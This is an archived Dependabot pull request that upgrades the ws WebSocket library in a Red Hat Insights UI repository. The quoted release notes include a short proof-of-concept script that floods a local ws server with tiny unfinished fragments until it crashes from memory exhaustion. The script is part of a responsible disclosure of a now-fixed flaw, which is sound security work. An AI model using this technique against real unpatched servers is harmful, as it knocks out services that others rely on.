---
type: pull_request
number: 1664
title: "chore(deps): bump ws from 8.20.1 to 8.21.0"
state: merged
author: dependabot
created: 2026-06-19T11:26:45Z
updated: 2026-06-19T13:18:44Z
closed: 2026-06-19T13:18:35Z
merged: 2026-06-19T13:18:35Z
base_branch: master
head_branch: dependabot/npm_and_yarn/ws-8.21.0
labels: ["dependencies", "minor"]
url: https://github.com/RedHatInsights/patchman-ui/pull/1664
---

# Pull Request #1664: chore(deps): bump ws from 8.20.1 to 8.21.0

**Author**: @dependabot
**Created**: June 19, 2026 at 11:26 AM UTC
**Status**: Merged
**Labels**: `dependencies`, `minor`
**Base**: `master` ← **Head**: `dependabot/npm_and_yarn/ws-8.21.0`

## Description

Bumps [ws](https://github.com/websockets/ws) from 8.20.1 to 8.21.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href="https://github.com/websockets/ws/releases">ws's releases</a>.</em></p>
<blockquote>
<h2>8.21.0</h2>
<h1>Features</h1>
<ul>
<li>Introduced the <code>maxBufferedChunks</code> and <code>maxFragments</code> options (2b2abd45).</li>
</ul>
<h1>Bug fixes</h1>
<ul>
<li>Fixed a remote memory exhaustion DoS vulnerability (2b2abd45).</li>
</ul>
<p>A high volume of tiny fragments and data chunks could be sent by a peer, using
modest network traffic, to crash a <code>ws</code> server or client due to OOM.</p>
<pre lang="js"><code>import { WebSocket, WebSocketServer } from 'ws';
<p>const wss = new WebSocketServer({ port: 0 }, function () {
const data = Buffer.alloc(1);
const options = { fin: false };
const { port } = wss.address();
const ws = new WebSocket(<code>ws://localhost:${port}</code>);</p>
<p>ws.on('open', function () {
(function send() {
ws.send(data, options, function (err) {
if (err) return;
send();
});
})();
});</p>
<p>ws.on('error', console.error);
ws.on('close', function (code, reason) {
console.log(<code>client close - code: ${code} reason: ${reason.toString()}</code>);
});
});</p>
<p>wss.on('connection', function (ws) {
ws.on('error', console.error);
ws.on('close', function (code, reason) {
console.log(<code>server close - code: ${code} reason: ${reason.toString()}</code>);
});
});
</code></pre></p>
<p>The vulnerability was responsibly disclosed and fixed by <a href="https://github.com/Nadav0077">Nadav Magier</a>.</p>
<p>In vulnerable versions, the issue can be mitigated by lowering the value of the
<code>maxPayload</code> option if possible.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href="https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94"><code>bca91ad</code></a> [dist] 8.21.0</li>
<li><a href="https://github.com/websockets/ws/commit/2b2abd458a1b647d0b6033bd62a619c36189839a"><code>2b2abd4</code></a> [security] Limit retained message parts</li>
<li><a href="https://github.com/websockets/ws/commit/78eabe2a6677b231bf9c82601bde86ff91639490"><code>78eabe2</code></a> [security] Add latest vulnerability to SECURITY.md</li>
<li>See full diff in <a href="https://github.com/websockets/ws/compare/8.20.1...8.21.0">compare view</a></li>
</ul>
</details>
<br />


---

## Discussion

### Comment by @swadeley on June 19, 2026 at 01:11 PM UTC

@dependabot rebase

---

## Reviews

### Review by @swadeley - Approved on June 19, 2026 at 01:11 PM UTC

ACK

---

*Archived from: https://github.com/RedHatInsights/patchman-ui/pull/1664*
